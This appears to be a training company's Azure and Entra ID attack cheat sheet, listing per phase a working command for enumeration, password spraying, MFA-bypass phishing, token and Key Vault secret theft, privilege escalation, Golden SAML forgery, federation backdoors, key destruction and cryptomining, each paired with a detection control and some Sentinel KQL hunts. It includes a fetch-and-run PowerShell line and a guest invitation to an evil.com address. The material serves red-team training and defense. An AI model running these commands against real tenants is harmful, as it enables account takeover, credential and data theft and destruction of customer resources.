# Azure Cloud Attack Cheat Sheet

A phase-by-phase offensive security reference for Azure, with a real command for every technique. Maintained by [Pwned Labs](https://pwnedlabs.io), which teaches these attacks and their defenses hands-on in live Azure environments through Academy labs and the Microsoft Cloud Attack and Defense bootcamp (MCRTP).

The full interactive version, with one-click copy for every command, is at **[https://pwnedlabs.io/resources/azure-cloud-attack-cheat-sheet](https://pwnedlabs.io/resources/azure-cloud-attack-cheat-sheet)**.

---

## How to Use This Cheat Sheet

Pwned Labs built this Azure Cloud Attack Cheat Sheet from the hands-on labs in its [Microsoft Cloud Attack and Defense bootcamp](https://pwnedlabs.io/bootcamps/mcrtp-bootcamp), which leads to the MCRTP (Microsoft Cloud Red Team Professional) certification. Azure attacks are identity attacks: Entra ID hands out OAuth 2.0 and OpenID Connect tokens over the public internet, so an operator obtains a token, widens what it can reach, then keeps that access. The sections below follow that order. Each row pairs a technique with a real command, what the command returns, and the control that catches it. Commands use variables such as `$armToken` and `user@target.com` in place of live values.

| Phase | Goal | Primary surface |
| --- | --- | --- |
| **Enumeration** | Map the tenant, users, roles and resources | Login endpoints, Microsoft Graph, Azure Resource Manager |
| **Initial access** | Obtain a first valid token | Password spray, AitM phishing, device code, OAuth consent |
| **Credential and token access** | Collect more tokens, secrets and keys | Token cache, PRT, Key Vault, managed identity, storage |
| **Privilege escalation** | Turn a low-privilege identity into a high one | Entra roles, Azure RBAC, ownership, dynamic groups, AUs |
| **Lateral movement** | Reach new identities, resources and clouds | Managed identities, M365 data, hybrid certificates, PRTs |
| **Persistence** | Keep access after a password reset | App credentials, federation, Intune, guest accounts |
| **Impact** | Act on the objective | Data theft, key deletion, resource and billing abuse |
| **Detection and defense** | Catch each step | Conditional Access, PIM, Sentinel KQL, Defender |

## Enumeration and Reconnaissance

Recon is the first step, whether or not we already hold a credential. Unauthenticated endpoints confirm whether a domain uses Entra ID and whether a given user exists. Once a token is in hand, Microsoft Graph and Azure Resource Manager expose the directory and the resource estate. Pwned Labs teaches tenant recon with AzureHound and BloodHound in its free [Intro to Azure Recon with BloodHound](https://pwnedlabs.io/explore/intro-to-azure-recon-with-bloodhound) lab.

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Tenant discovery (unauthenticated) | `Invoke-RestMethod -Uri "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"` | Confirms the domain uses Entra ID and returns its tenant ID, with no credential. | Unauthenticated and hard to block. Treat it as a reason to harden downstream authentication. |
| Username wordlist ([username-anarchy](https://github.com/urbanadventurer/username-anarchy)) | `ruby username-anarchy --suffix @target.com First Last > emails.txt` | A candidate email list to feed user validation. | No tenant signal. Depends on predictable UPN formats. |
| User validation ([o365enum](https://github.com/gremwell/o365enum)) | `python3 o365enum.py -u emails.txt -n 1 -m office.com` | Marks which addresses exist in Microsoft 365 (valid = 1), seeding a spray. | Low-noise probe. Monitor for high-volume lookups against the login endpoints. |
| Directory dump ([ROADtools / roadrecon](https://github.com/dirkjanm/ROADtools)) | `roadrecon auth --access-token $aadGraphToken``roadrecon gather` | A local database of users, groups, apps, service principals, role assignments and policies for offline review. | Bulk Graph reads. Alert on large directory enumeration from one principal in a short window. |
| Conditional Access export (roadrecon) | `roadrecon plugin policies` | Renders the tenant Conditional Access policies as HTML, exposing exclusions to abuse. | Reading policy requires a token. Review CAP exclusions regularly. |
| Graph and Azure collection ([AzureHound](https://github.com/SpecterOps/AzureHound) + [BloodHound](https://github.com/SpecterOps/BloodHound)) | `azurehound -r "$refreshToken" list --tenant "target.com" -o out.json` | Data for BloodHound to graph abusable paths, for example user to managed identity. | High-volume Graph and ARM calls. Baseline normal service-account read rates. |
| Resource and RBAC enumeration (Az PowerShell) | `Get-AzResource \| Select-Object ResourceType, Name \| Sort-Object ResourceType``Get-AzRoleAssignment -ObjectId <objectId>` | The resources an identity can see and the RBAC roles it holds. | Reader-level reads look benign. Watch for enumeration followed by a write. |

**Defenders:** Directory and resource reads are signal, not noise. Alert on bulk Graph enumeration, keep Conditional Access exclusions to a minimum, and remember unauthenticated user checks raise the value of strong authentication.

## Initial Access

Most Azure intrusions begin with a valid token, not a software exploit. The common routes are a weak password, an adversary-in-the-middle phish that captures a session after MFA, the device code flow, and illicit OAuth consent. Pwned Labs covers device code phishing and MFA enablement gaps in its free [Loot Exchange, Teams and SharePoint with GraphRunner](https://pwnedlabs.io/explore/loot-exchange-teams-sharepoint-with-graphrunner) lab.

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Password spraying ([Oh365UserFinder](https://github.com/dievus/Oh365UserFinder)) | `python3 oh365userfinder.py -p Velkommen1 --pwspray --elist emails.txt` | A valid credential pair, and whether MFA is enabled on the account. | Low-and-slow sprays stay under lockout. Alert on many failures across many accounts from one source. |
| MFA enablement gaps ([MFASweep](https://github.com/dafthack/MFASweep)) | `Invoke-MFASweep -Username user@target.com -Password <password> -Recon` | Which Microsoft services and client IDs accept single-factor sign-in for the account. | Repeated sign-ins across endpoints. Enforce MFA for all apps, not a subset. |
| Confirm and mint tokens past MFA gaps ([FindMeAccess](https://github.com/absolomb/FindMeAccess)) | `python3 findmeaccess.py audit -u user@target.com -p <password> -c d3590ed6-52b3-4102-aeff-aad2292ab01c -r https://management.azure.com``python3 findmeaccess.py token -u user@target.com -p <password> -c d3590ed6-52b3-4102-aeff-aad2292ab01c -r https://management.azure.com` | An access and refresh token for a resource (here Azure Resource Manager) that is reachable without MFA. | A single-factor token for a sensitive resource. Require MFA on ARM and Graph via Conditional Access. |
| Device code phishing ([GraphRunner](https://github.com/dafthack/GraphRunner)) | `Get-GraphTokens -Device AndroidMobile` | Access and refresh tokens that satisfy MFA, with no proxy, after the victim enters the code at microsoft.com/devicelogin. | Alert on device code sign-ins (authenticationProtocol deviceCode) that are rare in normal use. |
| Adversary-in-the-middle ([Evilginx](https://github.com/kgretzky/evilginx2)) | `phishlets enable o365``lures create o365` | The session cookie captured after the victim completes MFA, so an already-authenticated session is replayed. | Require phishing-resistant MFA (FIDO2, certificate). Alert on token replay from new locations. |
| Illicit OAuth consent grant (Microsoft Graph) | `az ad app permission add --id <appId> --api 00000003-0000-0000-c000-000000000000 --api-permissions 570282fd-fa5c-430d-a7fd-fc8dc98a9dca=Scope` | Delegated permissions such as Mail.Read for an attacker app, if user consent is allowed. | Restrict user consent to verified publishers. Review enterprise app consent grants. |

**Defenders:** Require phishing-resistant MFA, block legacy authentication, restrict user consent to verified publishers, and alert on device code sign-ins and first-seen single-factor tokens for ARM, Graph, Key Vault and storage.

## Credential and Token Access

Inside the tenant, the work shifts to collecting more tokens, secrets and keys. Azure issues credentials in many places: client token caches, device-bound Primary Refresh Tokens, Key Vault, and the managed identities attached to compute. Pwned Labs teaches reading secrets from Key Vault in its free [Unlock Access with Azure Key Vault](https://pwnedlabs.io/explore/unlock-access-with-azure-key-vault) lab.

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Token cache theft (Azure CLI / MSAL) | `cat ~/.azure/msal_token_cache.json` | Cached access and refresh tokens from a foothold host, reusable from the attacker machine. | Protect user profiles and endpoints. Short token lifetimes and device binding reduce reuse. |
| FoCI refresh-token exchange ([ROADtools / roadtx](https://github.com/dirkjanm/ROADtools)) | `roadtx auth --refresh-token "$refreshToken" -c 04b07795-8ddb-461a-bbee-02f9e1bf7b46 -r https://management.core.windows.net/ --tokens-stdout` | A token for a different first-party client and audience from one refresh token, with no re-authentication. | Family-of-Client-IDs behavior is by design. Watch for one refresh token used across many audiences. |
| Managed identity token on a VM (IMDS) | `Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"}` | A token for the VM managed identity with whatever RBAC it holds. | Alert on IMDS access from unusual processes. Scope managed identities to least privilege. |
| Managed identity token on App Service / Container Apps | `$t = Invoke-RestMethod -Uri "$env:IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2019-08-01" -Headers @{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER}` | A token for the app managed identity using the injected IDENTITY_ENDPOINT and IDENTITY_HEADER. | SSRF and command injection reach this endpoint. Keep identity RBAC minimal and log token requests. |
| Key Vault secret read (Az CLI) | `az keyvault secret list --vault-name <vault>``az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv` | Secrets, keys and certificates, often including service principal credentials. | Use Key Vault RBAC, enable logging and purge protection, and alert on bulk secret reads. |
| Key Vault secret read over REST (data plane token) | `Invoke-RestMethod -Uri "https://<vault>.vault.azure.net/secrets/<name>?api-version=7.4" -Headers @{Authorization="Bearer $kvToken"}` | The same secrets with only a vault.azure.net scoped token, no portal access. | Monitor SecretGet on the vault data plane from new principals. |
| Storage blobs over the data plane | `Invoke-RestMethod -Uri "https://<account>.blob.core.windows.net/?comp=list" -Headers @{Authorization="Bearer $storageToken"; "x-ms-version"="2021-08-06"}` | Container and blob listings, then direct download, when the account allows Entra auth and the identity has a data role. | Prefer private endpoints and least-privilege data roles. Log anonymous and token-based blob reads. |
| Automation Account variables (Az PowerShell) | `Get-AzAutomationVariable -ResourceGroupName <rg> -AutomationAccountName <account>` | Plaintext variables that frequently hold passwords and flags. | Mark variables encrypted, avoid secrets in automation, and audit variable reads. |

**Defenders:** Scope managed identities tightly, put Key Vault behind RBAC with logging and purge protection, prefer short-lived tokens, and monitor secret reads and metadata-service access from processes that should not touch them.

## Privilege Escalation

Escalation in Azure usually abuses an assignment or an ownership relationship, not a memory bug. Entra directory roles, Azure RBAC and object ownership each offer a path upward. Pwned Labs covers administrative unit blind spots and dynamic group abuse in its [Abuse Dynamic Groups in Entra ID for Privilege Escalation](https://pwnedlabs.io/explore/abuse-dynamic-groups-in-entra-id-for-privilege-escalation) lab.

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Find abusable dynamic groups ([GraphRunner](https://github.com/dafthack/GraphRunner)) | `Get-DynamicGroups -Tokens $tokens` | Dynamic groups and their membership rules, for example (user.userPrincipalName -contains "admin"). | Avoid attribute-driven rules for privileged groups. Alert on user attribute changes that match a rule. |
| Join a group by setting an attribute (Microsoft Graph) | `az rest --method PATCH --url "https://graph.microsoft.com/v1.0/users/<id>" --body '{"jobTitle":"Algorithm Administrator"}'` | Membership of a dynamic group that grants access, by matching its rule attribute. | Restrict who can edit sensitive attributes. Monitor User Update events on privileged-group attributes. |
| Abuse owned apps and service principals (Microsoft Graph) | `Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/ownedObjects" -Headers $headers``az ad app credential reset --id <appId> --append` | A new client secret on an owned app, granting its API permissions without Global Administrator. | Audit app and SP ownership. Alert on new application credentials (Add service principal credentials). |
| Reset a target password ([BARK](https://github.com/BloodHoundAD/BARK)) | `iex (iwr https://raw.githubusercontent.com/BloodHoundAD/BARK/main/BARK.ps1)``Set-EntraUserPassword -TargetUserId victim@target.com -Token $token -Password <new>` | Control of a higher-privileged user when the caller holds the right directory role. | Use PIM for role activation. Alert on Reset user password by non-helpdesk principals. |
| Administrative unit blind spot (Microsoft Graph beta) | `Get-MgBetaDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <auId>` | Scoped role members that path-based tooling misses, for example a User Administrator over a unit. | Review AU scoped role assignments. They are a common audit gap. |
| Azure RBAC role assignment (Az PowerShell) | `New-AzRoleAssignment -ObjectId <objectId> -RoleDefinitionName Owner -Scope <scope>` | A new role at a scope when the identity already holds Owner or User Access Administrator. | Alert on role assignment writes. Keep Owner and UAA rare and PIM-eligible. |

**Defenders:** Audit application and group ownership, make high roles PIM-eligible rather than permanent, avoid attribute-driven dynamic groups for privileged access, and review administrative unit scoped roles.

## Lateral Movement

Lateral movement crosses from one identity or resource to the next, and in Azure it often crosses into Microsoft 365 and back to on-premises. Managed identities pivot to other resources, and a hybrid certificate can carry an on-premises foothold into the cloud. Pwned Labs teaches Exchange, Teams and SharePoint looting with GraphRunner in the [GraphRunner lab](https://pwnedlabs.io/explore/loot-exchange-teams-sharepoint-with-graphrunner).

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Pivot on a managed identity (Az PowerShell) | `Connect-AzAccount -AccessToken $miToken -AccountId managed-identity``Get-AzResource` | The resources the managed identity can reach, such as a Key Vault, storage account or database server. | Separate identities per resource and keep their RBAC minimal. |
| Reach a database the identity can see | `Get-AzMySqlFlexibleServer -ResourceGroupName <rg> -Name <server>``mysql -h <server>.mysql.database.azure.com -u <user> -D <db> -p` | The server FQDN and a path to the data plane. | Restrict database network access and credentials. Monitor new client connections. |
| Loot SharePoint and OneDrive ([GraphRunner](https://github.com/dafthack/GraphRunner)) | `Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm password` | Files and secrets across the tenant that surface more credentials and targets. | Data-access spikes on Graph. Apply sensitivity labels and DLP. |
| Read Teams messages ([AADInternals](https://github.com/Gerenios/AADInternals)) | `Get-AADIntTeamsMessages -AccessToken $teamsToken` | Chat content, which frequently contains credentials shared between colleagues. | Alert on Skype/Teams token use by non-interactive clients. |
| Hybrid cloud pivot via ADCS ESC1 ([Certipy](https://github.com/ly4k/Certipy)) | `certipy req -u user@onprem.local -p <password> -ca <CA> -template VulnerableESC1 -upn victim@target.com` | A certificate whose SAN is an arbitrary UPN, which Entra Certificate-Based Authentication accepts as that cloud user. | Harden certificate templates (no enrollee-supplied SAN), and scope which CAs feed cloud CBA. |
| Use a device-context PRT ([ROADtools / roadtx](https://github.com/dirkjanm/ROADtools)) | `roadtx browserprtauth --prt-file device.prt -url https://office.com` | Access that satisfies device-compliance Conditional Access that a plain browser session cannot. | Require managed, compliant devices and monitor PRT issuance for unrecognised devices. |

**Defenders:** Separate identities per resource, restrict managed identity RBAC, monitor cross-tenant and federated sign-ins, and harden on-premises certificate templates that feed cloud Certificate-Based Authentication.

## Persistence

Persistence in Azure survives a password reset because it lives in application and tenant configuration rather than one user secret. The Pwned Labs [Microsoft Cloud Attack and Defense Bootcamp, Expert Edition](https://pwnedlabs.io/bootcamps/mcrte-bootcamp), which leads to the MCRTE (Microsoft Cloud Red Team Expert) certification, covers domain federation abuse and backdoors in Entra applications.

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Add an app or service principal credential (Az CLI) | `az ad app credential reset --id <appId> --append` | Token-based access that no user password reset affects. | Alert on Add service principal credentials in AuditLogs. Review app credentials regularly. |
| Domain federation backdoor (Microsoft Graph) | `az rest --method POST --url "https://graph.microsoft.com/v1.0/domains/<domain>/federationConfiguration" --headers "Content-Type=application/json" --body @federation.json` | A trusted SAML issuer the attacker controls, requiring Domain.ReadWrite.All. | Alert on Set domain authentication and new federation config. This is a critical-severity change. |
| Forge a SAML token for any UPN ([ROADtools / roadtx](https://github.com/dirkjanm/ROADtools)) | `roadtx samltoken --mfa -i "http://any.sts/adfs/services/trust/" --upn victim@target.com --cert-pfx signing.pfx --pfx-pass ""` | A valid assertion the Microsoft cloud accepts, a cloud Golden SAML, issuing real tokens for any user. | Protect the token-signing certificate and alert on federation changes. Prefer managed authentication. |
| Enroll an attacker device ([Pytune](https://github.com/secureworks/pytune) / [AADInternals](https://github.com/Gerenios/AADInternals)) | `roadtx prtauth --prt-file device.prt -r devicereg` | A registered, compliant-looking device that satisfies device-based Conditional Access. | Alert on new device registrations and Intune enrollments. Apply enrollment restrictions on every platform. |
| Invite a guest and assign a role (Microsoft Graph) | `New-MgInvitation -InvitedUserEmailAddress attacker@evil.com -InviteRedirectUrl https://myapps.microsoft.com` | A quieter long-term identity once a role is assigned to it. | Review guest accounts and their roles. Restrict external collaboration where possible. |
| Consent-based persistence (Microsoft Graph) | `az ad app permission admin-consent --id <appId>` | An app whose API permissions survive credential changes, a durable backdoor. | Audit admin-consented apps and their permissions. Alert on new admin consent grants. |

**Defenders:** Alert on new app credentials, federation and domain changes, and privileged role assignments; review enterprise applications and their consent; and watch Intune for unexpected device enrollment and app deployment.

## Impact

Impact is acting on the objective, which in cloud tenants is usually data theft, destruction, or abuse of compute and billing. Pwned Labs shows how storage, Key Vault and database access turn into data theft in its [Microsoft Cloud Attack and Defense bootcamp](https://pwnedlabs.io/bootcamps/mcrtp-bootcamp), assessed in a live Azure tenant.

| Technique | Command | What it gives you | Detection / defense |
| --- | --- | --- | --- |
| Exfiltrate storage data (Az CLI) | `az storage blob download-batch -s <container> -d . --account-name <account> --auth-mode login` | Bulk download of a container the identity can read. | Immutable backups and private endpoints limit this. Alert on large egress from storage. |
| Exfiltrate mailboxes ([GraphRunner](https://github.com/dafthack/GraphRunner)) | `Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 100` | Mail content across the mailbox the token can reach. | Alert on mass mail reads and new mail-forwarding rules. |
| Destroy or ransom Key Vault keys (Az CLI) | `az keyvault key delete --vault-name <vault> --name <key>``az keyvault key purge --vault-name <vault> --name <key>` | Dependent data rendered unusable when soft-delete and purge protection are off. | Enable soft-delete and purge protection, and alert on key delete and purge operations. |
| Resource and billing abuse (Az CLI) | `az vm create -g <rg> -n miner --image Ubuntu2204 --size Standard_D8s_v5 --admin-username azureuser --generate-ssh-keys` | Compute for cryptomining or outbound abuse, billed to the victim subscription. | Cap spend with budgets and alerts. Restrict who can deploy compute and alert on new high-SKU VMs. |

**Defenders:** Enable soft-delete and purge protection, apply resource locks and immutable backups, cap spend with budgets and alerts, and rehearse cloud incident response for identity compromise.

## Detection and Defense

Each phase above leaves signal, and the controls map onto the same order. Pwned Labs builds and validates Microsoft Sentinel detections in KQL at each stage of the attack chain in its [Microsoft Cloud Attack and Defense Bootcamp, Expert Edition](https://pwnedlabs.io/bootcamps/mcrte-bootcamp), and shows how Conditional Access gaps appear in its [Exploit MFA Enablement Gaps for Resource Access](https://pwnedlabs.io/explore/exploit-mfa-enablement-gaps-for-resource-access) lab.

| Control | Query or command | What it catches |
| --- | --- | --- |
| Device code sign-in hunt (Microsoft Sentinel KQL) | `SigninLogs \| where AuthenticationProtocol == "deviceCode" \| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress` | Device code phishing, which is rare in normal use. |
| Legacy authentication hunt (KQL) | `SigninLogs \| where ClientAppUsed in ("IMAP4","POP3","SMTP","Other clients") \| summarize count() by UserPrincipalName, ClientAppUsed` | Legacy protocols that bypass MFA when not blocked. |
| New app credential hunt (KQL) | `AuditLogs \| where OperationName in ("Add service principal credentials","Update application - Certificates and secrets management") \| project TimeGenerated, InitiatedBy, TargetResources` | Application-credential persistence and owned-app abuse. |
| Federation change hunt (KQL) | `AuditLogs \| where OperationName in ("Set domain authentication","Set federation settings on domain") \| project TimeGenerated, InitiatedBy, TargetResources` | Domain federation backdoors and Golden SAML setup. |
| Privileged Identity Management review (Microsoft Graph) | `Get-MgRoleManagementDirectoryRoleEligibilitySchedule -All` | Standing high-privilege roles that should be just-in-time. |
| App consent and permission audit (roadrecon) | `roadrecon plugin policies` | Over-permissioned and consented applications across the tenant. |

**Defenders:** Detection is only as good as its coverage, so test it: run the technique in a lab tenant, confirm the log fires, and tune the rule. Black-box monitoring alone cannot prove internal coverage.

## Tooling Reference

Every tool on this sheet, its repository, and the single command that matters. Pwned Labs teaches each one in a live Azure and Microsoft 365 tenant rather than in theory.

| Tool | What it does | Key command |
| --- | --- | --- |
| [ROADtools](https://github.com/dirkjanm/ROADtools) | Entra enumeration (roadrecon) and token acquisition and exchange (roadtx). | `roadrecon gather` |
| [AzureHound](https://github.com/SpecterOps/AzureHound) | Collects Entra and Azure data for BloodHound. | `azurehound -r "$refreshToken" list --tenant "target.com" -o out.json` |
| [BloodHound](https://github.com/SpecterOps/BloodHound) | Graphs abusable Entra and Azure attack paths. | `Import out.json into BloodHound and run the built-in Azure queries` |
| [AADInternals](https://github.com/Gerenios/AADInternals) | Entra and M365 manipulation, token handling and Teams data access. | `Get-AADIntTeamsMessages -AccessToken $teamsToken` |
| [GraphRunner](https://github.com/dafthack/GraphRunner) | Microsoft Graph post-exploitation: device code, dynamic groups, mail and SharePoint looting. | `Get-GraphTokens -Device AndroidMobile` |
| [MFASweep](https://github.com/dafthack/MFASweep) | Finds Microsoft services and client IDs where MFA is not enforced. | `Invoke-MFASweep -Username user@target.com -Password <password> -Recon` |
| [FindMeAccess](https://github.com/absolomb/FindMeAccess) | Audits single-factor access per resource and mints tokens through the gap. | `python3 findmeaccess.py audit -u user@target.com -p <password> -c d3590ed6-52b3-4102-aeff-aad2292ab01c -r https://management.azure.com` |
| [BARK](https://github.com/BloodHoundAD/BARK) | Entra abuse primitives such as password reset and credential add. | `Set-EntraUserPassword -TargetUserId victim@target.com -Token $token -Password <new>` |
| [TokenTactics](https://github.com/f-bader/TokenTacticsV2) | Requests and refreshes Azure and Graph tokens for FoCI abuse. | `Get-AzureToken -Client MSGraph` |
| [Certipy](https://github.com/ly4k/Certipy) | ADCS attacks, including ESC1 SAN spoofing for hybrid CBA. | `certipy req -u user@onprem.local -p <password> -ca <CA> -template VulnerableESC1 -upn victim@target.com` |
| [MicroBurst](https://github.com/NetSPI/MicroBurst) | Azure services enumeration and credential harvesting (PowerShell). | `Get-AzPasswords -Verbose` |
| [Pytune](https://github.com/secureworks/pytune) | Registers and enrols fake devices into Intune for compliance bypass. | `python3 pytune.py enroll -u user@target.com -p <password> -d Android` |
| [Oh365UserFinder](https://github.com/dievus/Oh365UserFinder) | Validates O365 users and sprays passwords. | `python3 oh365userfinder.py -p Velkommen1 --pwspray --elist emails.txt` |
| [o365enum](https://github.com/gremwell/o365enum) | Enumerates valid Microsoft 365 user addresses. | `python3 o365enum.py -u emails.txt -n 1 -m office.com` |
| [username-anarchy](https://github.com/urbanadventurer/username-anarchy) | Generates candidate usernames and email addresses. | `ruby username-anarchy --suffix @target.com First Last > emails.txt` |
| [Evilginx](https://github.com/kgretzky/evilginx2) | Adversary-in-the-middle phishing that captures post-MFA session cookies. | `lures create o365` |
| [evil-winrm](https://github.com/Hackplayers/evil-winrm) | WinRM shell to a compromised Windows host during a hybrid pivot. | `evil-winrm -i <host> -u <user> -p <password>` |

## Practice this at Pwned Labs

The fastest way from this cheat sheet to real skill is the **[Microsoft Cloud Attack and Defense bootcamp](https://pwnedlabs.io/bootcamps/mcrtp-bootcamp)**, which runs every phase above against live Azure and Microsoft 365 tenants and certifies the skill with the MCRTP exam. The free labs below are the way in.

The techniques above are best learned by running them. Pwned Labs runs them as hands-on labs in live Azure and Microsoft 365 tenants. The first three labs below are free.

- **[Intro to Azure Recon with BloodHound](https://pwnedlabs.io/explore/intro-to-azure-recon-with-bloodhound)** (Free, Beginner): collect Azure and Entra ID data with AzureHound and map the abusable relationships and attack paths in a tenant with BloodHound.
- **[Loot Exchange, Teams and SharePoint with GraphRunner](https://pwnedlabs.io/explore/loot-exchange-teams-sharepoint-with-graphrunner)** (Free, Beginner): find Microsoft services where MFA is not enforced, then see how much Exchange Online, Teams and SharePoint data a phished account reaches with GraphRunner.
- **[Unlock Access with Azure Key Vault](https://pwnedlabs.io/explore/unlock-access-with-azure-key-vault)** (Free, Beginner): read secrets from Azure Key Vault and use them to extend access, the credential-access step in the chain above.
- **[Abuse Dynamic Groups in Entra ID for Privilege Escalation](https://pwnedlabs.io/explore/abuse-dynamic-groups-in-entra-id-for-privilege-escalation)** (Premium, Beginner): enumerate Entra ID and administrative units, then abuse User Administrator permissions and dynamic group membership to escalate.

Browse the full set at [pwnedlabs.io/explore](https://pwnedlabs.io/explore). To work the whole chain end to end and certify, the [Microsoft Cloud Attack and Defense bootcamp](https://pwnedlabs.io/bootcamps/mcrtp-bootcamp) leads to the MCRTP (Microsoft Cloud Red Team Professional) certification, assessed in a live Azure and Microsoft 365 tenant, and the [Microsoft Cloud Attack and Defense Bootcamp, Expert Edition](https://pwnedlabs.io/bootcamps/mcrte-bootcamp) leads to the MCRTE (Microsoft Cloud Red Team Expert) certification, which goes deeper into hybrid attack chains and Microsoft Sentinel detection engineering.

## Frequently Asked Questions

### What are the phases of an Azure attack?

Enumeration, initial access, credential and token access, privilege escalation, lateral movement, persistence, impact and defense. This Pwned Labs cheat sheet lists a real command, what it returns and the control that catches it for each phase.

### How do attackers get initial access to Azure and Entra ID?

Password spraying, adversary-in-the-middle phishing that captures a session cookie after MFA, device code phishing, and illicit OAuth consent. A valid token, not a software exploit, is the usual way in.

### How do attackers bypass MFA in Entra ID?

Usually by stealing a token rather than beating the prompt. A session or refresh token represents an already-authenticated session, so it carries the MFA claim. Device code phishing and kits like Evilginx capture these tokens. Pwned Labs teaches how this works and how to prevent it in its Azure labs.

### What is a managed identity attack in Azure?

Code on a VM, App Service, Function or Container App can request a token for its managed identity from the IMDS endpoint or the IDENTITY_ENDPOINT. If that identity has broad RBAC, a foothold on the resource inherits it, which is a common lateral-movement step.

### How do attackers persist in an Azure tenant?

By changing tenant and application configuration: adding credentials to an app registration or service principal, adding a federated domain to sign SAML assertions, enrolling a device, or keeping a consented application. These survive a user password reset.

### Which tools attack Azure and Entra ID?

ROADtools, AzureHound with BloodHound, AADInternals, GraphRunner, MFASweep, FindMeAccess, BARK, Certipy and the Azure CLI and Az PowerShell. The tooling table above links each repository and the one command that matters. Pwned Labs teaches these in live Azure labs.

### Where can I practice Azure attacks legally?

In isolated lab tenants built for it. Pwned Labs runs hands-on Azure and Entra ID labs and the MCRTP and MCRTE certifications, which are assessed in live Microsoft cloud environments rather than multiple-choice exams.

**About Pwned Labs**

Pwned Labs is a hands-on cloud and AI offensive security training platform. It runs real-world attack labs and bootcamps for AWS, Azure, GCP, Kubernetes and AI systems, including the ACRTP, MCRTP, GCRTP, KRTP and AISRTP certifications. Free labs are at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

---

## License

Published by Pwned Labs under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Share and adapt with attribution to Pwned Labs (https://pwnedlabs.io).
